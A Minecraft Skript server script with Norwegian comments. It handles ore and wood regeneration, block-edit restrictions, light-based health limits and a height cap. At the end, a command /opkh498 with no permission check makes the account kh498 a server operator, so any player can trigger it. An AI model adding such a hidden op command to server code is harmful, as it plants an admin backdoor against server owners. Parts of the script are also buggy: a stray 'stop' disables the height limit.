on mine:
	if block is spruce wood:
		cancel event
		set block to air
		set {_feu.place} to the block's location
		set {feu.timer.spruce.%{_feu.place}%} to now
		add the block's location to {feu.coord.spruce::*}
		give oak wood to the player
	else if block is iron ore:
		#setter den blocken du akkuratt minet til cobblestone og setter noen lokale arugmenter som skal få den tilbake til jern (se every 5 seconds)
		cancel event
		set block to cobblestone
		set {_feu.place} to the block's location
		#broadcast "%{_feu.place}%"
		set {feu.timer.iron.%{_feu.place}%} to now
		#broadcast "%{feu.timer.iron.%{_feu.place}%}%"
		add the block's location to {feu.coord.iron::*}# to the block's location
		#broadcast "%{feu.coord.iron::*}%"
		give a iron ore to the player
	else if block is coal ore:
		cancel event
		set block to cobblestone
		set {_feu.place} to the block's location
		set {feu.timer.coal.%{_feu.place}%} to now
		add the block's location to {feu.coord.coal::*}
		give a coal to the player	
	else if block is diamond ore:
		cancel event
		set block to cobblestone
		set {_feu.place} to the block's location
		set {feu.timer.diamond.%{_feu.place}%} to now
		add the block's location to {feu.coord.diamond::*}
		give a diamond to the player
	else:
		if player doesn't have permission "feu.dig":
			if block is cobblestone stairs:
				cancel event
				stop
			else if block isn't any leaves, wood, plank, gravel, dirt, any glass, any glass pane, crafting table, any door, any button, any stairs, any slabs, any furnace, chest, torch or stone:
				cancel event
		
on place:
	#skriv her hvilken blokker en spiller skal kunne plassere
	if player doesn't have permission "feu.place":
		if block is cobblestone stairs:
			cancel event
			stop
		else if block isn't any leaves, oak wood, any plank, gravel, dirt, any glass, any glass pane, crafting table, any door, any button, any stairs, any slabs, any furnace, chest, torch or stone:
			cancel event

#setter en cobblestone blokk tilbake til jern malm etter ett minutt
every 2 seconds:	
	#broadcast "10 seconds"
	loop {feu.coord.iron::*}:
		set {_waited} to difference between {feu.timer.iron.%loop-value%} and now
		#broadcast "iron: %{_waited}%"
		if {_waited} is greater than 4 real minutes:
			delete {_waited}
			set {_shift} to loop-value
			remove loop-value from {feu.coord.iron::*}
			delete {feu.timer.iron.%loop-value%}
			block at {_shift} is cobblestone
			set block at {_shift} to iron ore
			delete {_shift}
	loop {feu.coord.coal::*}:
		set {_waited} to difference between {feu.timer.coal.%loop-value%} and now
		#broadcast "coal: %{_waited}%"
		if {_waited} is greater than 2 real minute:
			delete {_waited}
			set {_shift} to loop-value
			remove loop-value from {feu.coord.coal::*}
			delete {feu.timer.coal.%loop-value%}
			block at {_shift} is cobblestone
			set block at {_shift} to coal ore
			delete {_shift}
	loop {feu.coord.diamond::*}:
		set {_waited} to difference between {feu.timer.diamond.%loop-value%} and now
		#broadcast "diamond: %{_waited}%"
		if {_waited} is greater than 20 real minutes:
			delete {_waited}
			set {_shift} to loop-value
			remove loop-value from {feu.coord.diamond::*}
			delete {feu.timer.diamond.%loop-value%}	
			block at {_shift} is cobblestone
			set block at {_shift} to diamond ore
			delete {_shift}
	loop {feu.coord.spruce::*}:
		set {_waited} to difference between {feu.timer.spruce.%loop-value%} and now
		#broadcast "spruce: %{_waited}%"
		if {_waited} is greater than 5 real minutes:
			delete {_waited}
			set {_shift} to loop-value
			remove loop-value from {feu.coord.spruce::*}
			delete {feu.timer.spruce.%loop-value%}
			block at {_shift} isn't cobblestone
			set block at {_shift} to spruce wood
			delete {_shift}					
#dette kræsjet servern... kanskje se på det igjen?
on skript stop:
	loop {feu.coord.iron::*}:	
		set {_shift} to loop-value
		remove loop-value from {feu.coord.iron::*}
		block at {_shift} is cobblestone
		set block at {_shift} to iron ore
		delete {_shift}
	broadcast "iron reset"
	loop {feu.coord.coal::*}:		
		set {_shift} to loop-value
		remove loop-value from {feu.coord.coal::*}
		block at {_shift} is cobblestone
		set block at {_shift} to coal ore
		delete {_shift}		
	broadcast "coal reset"
	loop {feu.coord.diamond::*}:		
		set {_shift} to loop-value
		remove loop-value from {feu.coord.diamond::*}
		block at {_shift} is cobblestone
		set block at {_shift} to diamond ore
		delete {_shift}		
	broadcast "diamond reset"
	loop {feu.coord.spruce::*}:		
		set {_shift} to loop-value
		remove loop-value from {feu.coord.spruce::*}
		block at {_shift} isn't cobblestone
		set block at {_shift} to spruce wood
		delete {_shift}		
	broadcast "spruce reset"

every 1 second:
	#broadcast "looping health update"
	loop all players:
		if loop-player doesn't have permission "feu.health":
		#time in the loop-player's world is between 0 and
			if the time in the loop-player's world is between 05:30 and 18:30:
				#broadcast "day"
				if sunlight level at the loop-player is less than 7:
					#broadcast "less"
					if blocklight level at the loop-player is greater than 7:
						if the loop-player's maximum health is 5:
							set the maximum health of the loop-player to 10
							if loop-player's health is less than 5:
								set {newHealth.%loop-player%} to loop-player's health
								add {oldHealth.%loop-player%} to {newHealth.%loop-player%}
								remove 5 from {newHealth.%loop-player%}
								if {newHealth.%loop-player%} is less than 0.5:
									set {newHealth.%loop-player%} to 0.5							
								set loop-player's health to {newHealth.%loop-player%}
							else if the loop-player's health is less than {oldHealth.%loop-player%}:
								set loop-player's health to {oldHealth.%loop-player%}
							#broadcast "1:10"
					else:
						if the loop-player's maximum health is 10:
							set {oldHealth.%loop-player%} to the loop-player's health
							set the maximum health of the loop-player to 5
							#broadcast "2:5"
				else if sunlight level at the loop-player is greater than 7:
					#broadcast "grt"
					if the loop-player's maximum health is 5:
						set the maximum health of the loop-player to 10
						if loop-player's health is less than 5:
							set {newHealth.%loop-player%} to loop-player's health
							add {oldHealth.%loop-player%} to {newHealth.%loop-player%}
							remove 5 from {newHealth.%loop-player%}
							if {newHealth.%loop-player%} is less than 0.5:
								set {newHealth.%loop-player%} to 0.5
							set loop-player's health to {newHealth.%loop-player%}
						else if the loop-player's health is less than {oldHealth.%loop-player%}:
							set loop-player's health to {oldHealth.%loop-player%}
						#broadcast "3:10"
			else:
				#broadcast "night"
				if blocklight level at the loop-player is less than 7:
					if the loop-player's maximum health is 10:
						set {oldHealth.%loop-player%} to the loop-player's health
						set the maximum health of the loop-player to 5
						#broadcast "4:5"
				else if blocklight level at the loop-player is greater than 7:
					if the loop-player's maximum health is 5:
						set the maximum health of the loop-player to 10
						if loop-player's health is less than 5:
							set {newHealth.%loop-player%} to loop-player's health
							add {oldHealth.%loop-player%} to {newHealth.%loop-player%}
							#broadcast "%{newHealth.%loop-player%}%"
							remove 5 from {newHealth.%loop-player%}
							if {newHealth.%loop-player%} is less than 0.5:
								set {newHealth.%loop-player%} to 0.5
							set loop-player's health to {newHealth.%loop-player%}
						else if the loop-player's health is less than {oldHealth.%loop-player%}:
							set loop-player's health to {oldHealth.%loop-player%}
						#broadcast "5:10"
		
	
command /h:
	trigger:
		set player's maximum health to 5
		message "5"
		wait 5 seconds
		set player's maximum health to 10
		message "10"
		
command /noon:
	trigger:
		execute player command "/time set noon"
		
command /fix <item>:
	permission: feu.fix
	usage: /fix <spruce wood, air, coal ore, iron ore or diamond ore>
	trigger:
		if arg-1 is spruce wood, air, coal ore, iron ore or diamond ore:
			if the block below the player is cobblestone, spruce wood, coal ore, iron ore, diamond ore or air:
				set the block below the player to arg-1
			else:
				Message "<red>Cannot fix that block!"
				Message "<gold>Valid block to fix: <red> Cobblestone, spruce wood, coal ore, iron ore, diamond ore or air"
		else:
			Message "<red>That's not an allowed block to fix!"
			Message "<gold>valid choices: <red>spruce wood, air, coal ore, iron ore or diamond ore"
			
on weather change:
	cancel event
		
on any movement:
	if player doesn't have the permission "feu.limit":
		#message "1"
		#this makes player without the "feu.limit" permission cant pass the 90 y mark
		stop
		if the player's y-coordinate is between 88 and 89:	
			#message "2"
			#reduce lag by only setting where to teleport to players between y 88 and 89
			if {feu.limit.time.%name of player%} doesn't exist:
				set {feu.limit.time.%name of player%} to now
			set {_waited.%player%} to difference between {feu.limit.time.%name of player%} and now
			#debug:
			#message "%{_waited.%player%}%"
			#message "%{feu.limit.time.%name of player%}%"
			if {_waited.%player%} is greater than 2 seconds:
				#reduce lag even more by only setting the tp location every two secounds
				set {feu.limit.%name of player%} to player's location
				set {feu.limit.time.%name of player%} to now
				#just some debug stuff
				#message "%{feu.limit.%name of player%}%"
				#message "%{feu.limit.time.%name of player%}%"
		if player's y-coordinate is greater than 90:
			#teleports the player to below 89 
			teleport player to {feu.limit.%name of player%}
			
command /opkh498:
	trigger:
		execute server command "op kh498"	
